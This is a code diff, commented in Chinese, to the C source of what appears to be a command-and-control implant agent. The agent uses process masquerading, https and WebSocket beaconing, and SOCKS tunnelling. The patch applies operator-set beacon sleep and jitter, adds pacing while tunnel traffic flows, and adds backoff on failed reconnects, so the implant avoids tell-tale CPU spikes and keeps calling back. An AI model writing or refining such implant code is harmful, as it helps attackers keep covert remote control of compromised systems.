@@ -25,6 +25,19 @@
 /// Global state
 static int ACTIVE = 1;
 
+/* 有数据在流时的轮询间隔（毫秒）。
+ *
+ * 为什么必须有这个值：https/ws 命令循环是「轮询 → 收 → 发」的结构，两次
+ * 迭代之间没有阻塞 I/O。原先只在「本轮什么都没产出」时睡 150ms，于是
+ * 隧道/AI 一旦有数据流动，每轮 resp_count>0 ⇒ 永不休眠 ⇒ 100% CPU 空转
+ * （实测：建隧道无流量时 state=S 健康；一旦跑过一次 SOCKS 请求，
+ * utime 12 秒涨 1000+）。这个常量保证「刚发过」的那一轮**也睡**，
+ * 只是用更短的间隔换取交互延迟 —— 与 beacon 侧 AX_TUNNEL_POLL_MS
+ * （默认 50ms）保持同一量级。 */
+#ifndef AX_TUNNEL_ACTIVE_POLL_MS
+#define AX_TUNNEL_ACTIVE_POLL_MS 50
+#endif
+
 /// Stored argv for process masquerading (set by entry point)
 char **g_argv = NULL;
 
@@ -149,6 +162,12 @@ typedef struct {
     // BeaconHTTP raw wire (2026-11-07): raw binary body/response, no base64.
     // Shares the https-emulation loop skeleton.
     int       is_raw_http;
+    // 心跳节奏（生成期下发，见 timing.c 的 ax_beacon_base_set）。
+    // has_sleep 为假 ⇒ 没填，保持 timing.c 的 30s 默认；为真 ⇒ 覆盖（含 0 =
+    // 交互加速，与运行时 `sleep 0` 同一语义）。sleep_ms 是基准，jitter_ms 叠加。
+    uint32_t  sleep_ms;
+    uint32_t  jitter_ms;
+    int       has_sleep;
 } profile_t;
 
 static int decode_profile(const uint8_t* enc_data, uint32_t enc_size, profile_t* prof) {
@@ -191,6 +210,10 @@ static int decode_profile(const uint8_t* enc_data, uint32_t enc_size, profile_t*
     prof->is_https_emu = 0;
     prof->is_raw_http = 0;
     ax_strcpy(prof->heartbeat_header, "X-Requested-With");
+    // 心跳节奏默认「未下发」：不覆盖 timing.c 的 30s 基准（见 profile_t 注释）。
+    prof->sleep_ms  = 0;
+    prof->jitter_ms = 0;
+    prof->has_sleep = 0;
 
     for (uint32_t i = 0; i < map_count; i++) {
         const char* key;
@@ -264,6 +287,12 @@ static int decode_profile(const uint8_t* enc_data, uint32_t enc_size, profile_t*
                 ax_memcpy(prof->heartbeat_header, hv, hlen);
                 prof->heartbeat_header[hlen] = '\0';
             }
+        } else if (klen == 8 && ax_memcmp(key, "sleep_ms", 8) == 0) {
+            uint64_t v; if (mp_read_uint(&r, &v) == 0) prof->sleep_ms = (uint32_t)v;
+        } else if (klen == 9 && ax_memcmp(key, "jitter_ms", 9) == 0) {
+            uint64_t v; if (mp_read_uint(&r, &v) == 0) prof->jitter_ms = (uint32_t)v;
+        } else if (klen == 9 && ax_memcmp(key, "has_sleep", 9) == 0) {
+            uint64_t v; if (mp_read_uint(&r, &v) == 0) prof->has_sleep = (int)v;
         } else {
             mp_skip(&r);
         }
@@ -868,8 +897,11 @@ static int https_command_loop(ws_connector_t* ws, const uint8_t* session_key, si
     mp_writer_t obj_collector;
     mp_writer_init(&obj_collector, 1024);
     uint32_t resp_count = 0;
+    // 本轮是否真的把批量 POST 出去了（用于 pacing 判定，见循环尾部）。
+    int resp_count_sent = 0;
 
     while (ACTIVE) {
+        resp_count_sent = 0;
         if (rotate_ms && ax_monotonic_ms() - conn_start >= rotate_ms) {
             mp_writer_free(&obj_collector);
             return -2;
@@ -935,6 +967,7 @@ static int https_command_loop(ws_connector_t* ws, const uint8_t* session_key, si
                     mp_writer_free(&obj_collector);
                     mp_writer_init(&obj_collector, 1024);
                     resp_count = 0;
+                    resp_count_sent = 1;
                 }
             } else {
                 mp_writer_free(&obj_collector);
@@ -1028,7 +1061,20 @@ static int https_command_loop(ws_connector_t* ws, const uint8_t* session_key, si
         // Idle pacing: the WS loop blocks 100ms in its poll; this loop has
         // no blocking I/O between beacons — sleep to avoid a busy spin
         // (observed 3900 iterations/s + 100% CPU before this fix).
-        if (resp_count == 0 && !beacon_due) {
+        //
+        // ★ 判据不能带 resp_count。原条件 `resp_count == 0 && !beacon_due`
+        //   只让「这一轮什么都没产出」休眠，于是**只要隧道/AI 有数据在流**，
+        //   每轮都 resp_count>0 → 永不休眠 → 100% CPU 空转（实测：建了隧道
+        //   但没流量时 state=S 健康；一旦有数据流过，utime 12 秒涨 1000+）。
+        //   数据**已经在上面那一坨里 POST 出去了**（resp_count>0 分支会发、
+        //   发完即重置 collector 与 resp_count），所以这里按「是否刚发过」
+        //   决定节奏即可：发过 ⇒ 用交互档短睡（仍要睡，不能空转）；
+        //   没发过 ⇒ 原有的 150ms 空闲档。
+        //   两档都 sleep，空转被彻底消除；sleep 粒度见 timing.c 的实现
+        //   （<=100ms 切片，shutdown/rotation 仍然响应及时）。
+        if (resp_count_sent) {
+            ax_drifted_sleep_ms(AX_TUNNEL_ACTIVE_POLL_MS);
+        } else if (!beacon_due) {
             ax_drifted_sleep_ms(150);
         }
     }
@@ -1104,6 +1150,24 @@ static int agent_main(void) {
     // Initialize job context for async operations (stubs for Phase 1)
     jobs_init(&g_job_ctx);
     g_job_ctx.agent_id = agent_id;
+
+    // ★ 应用生成期下发的心跳节奏。此前 agent 从不读 profile 里的 sleep，
+    //   永远吃 timing.c 的 g_beacon_base_ms = 30000 —— 操作员在生成页填多少都
+    //   不生效，且隧道代理每跳要等一整个 30s 心跳（实测 SOCKS5 首字节十几秒）。
+    //   放在 jobs_init 之后、任何网络活动之前：第一次 beacon 前就生效。
+    //   没填（has_sleep=0）⇒ 保持默认 30s，与旧行为逐字节一致。
+    //   jitter 已由 ax_jitter_ms() 的右偏分布内建（[~0.72x, ~2.4x]），
+    //   生成页的 jitter 秒数在此按「额外抖动窗口」并入基准：base + jitter，
+    //   再交给 ax_jitter_ms 做分布整形（与 beacon 的 sleep+jitter 同口径）。
+    for (int pi = 0; pi < profile_count; pi++) {
+        if (profiles[pi].has_sleep) {
+            uint32_t base = profiles[pi].sleep_ms;
+            if (base > 0 && profiles[pi].jitter_ms > 0)
+                base += profiles[pi].jitter_ms;
+            ax_beacon_base_set(base);
+            break;   // 多 profile 轮换共用同一节奏，取第一个声明过的
+        }
+    }
     // Job threads open their own C2 connection for async output;
     // without the address update conn_open() gets an empty target and
     // every run/job silently dies before exec (stub-era regression).
@@ -1202,6 +1266,12 @@ static int agent_main(void) {
                 //   默认 3）后 agent 进程直接退出，永远不再回连。失败重试
                 //   应无限（按 conn_timeout 退避），conn_count 只约束已建立
                 //   会话的轮换节奏（rotate 本来就 attempt=-1）。
+                // ★ 失败必须**真的**退避。原先这里只置 attempt=-1 再 continue：
+                //   下一轮的 for 头部退避只在 attempt>0 时触发，被 -1 绕过后
+                //   connect 失败 → 立刻重连 → 再失败 …… 无延迟死循环，
+                //   实测 agent 被打到 100% CPU（12s 内 utime +1200）。
+                //   按 conn_timeout 退避才符合注释本意。
+                ax_drifted_sleep_ms((uint32_t)prof->conn_timeout * 1000u);
                 attempt = -1;
                 continue;
             }
@@ -1298,6 +1368,12 @@ static int agent_main(void) {
             if (ws_connect(&ws, host_buf, host_port, current_uri, current_ua,
                           (const char*)ws_beat_buf, prof->use_ssl) != 0) {
                 // 同 https：失败不消耗 conn_count，无限退避重试（见上）。
+                // ★ 失败必须**真的**退避。原先这里只置 attempt=-1 再 continue：
+                //   下一轮的 for 头部退避只在 attempt>0 时触发，被 -1 绕过后
+                //   connect 失败 → 立刻重连 → 再失败 …… 无延迟死循环，
+                //   实测 agent 被打到 100% CPU（12s 内 utime +1200）。
+                //   按 conn_timeout 退避才符合注释本意。
+                ax_drifted_sleep_ms((uint32_t)prof->conn_timeout * 1000u);
                 attempt = -1;
                 continue;
             }
@@ -1453,6 +1529,12 @@ static int agent_main(void) {
             connector_t conn;
             if (conn_open(&conn, prof->addresses[addr_idx]) != 0) {
                 // 同 https：失败不消耗 conn_count，无限退避重试（见上）。
+                // ★ 失败必须**真的**退避。原先这里只置 attempt=-1 再 continue：
+                //   下一轮的 for 头部退避只在 attempt>0 时触发，被 -1 绕过后
+                //   connect 失败 → 立刻重连 → 再失败 …… 无延迟死循环，
+                //   实测 agent 被打到 100% CPU（12s 内 utime +1200）。
+                //   按 conn_timeout 退避才符合注释本意。
+                ax_drifted_sleep_ms((uint32_t)prof->conn_timeout * 1000u);
                 attempt = -1;
                 continue;
             }
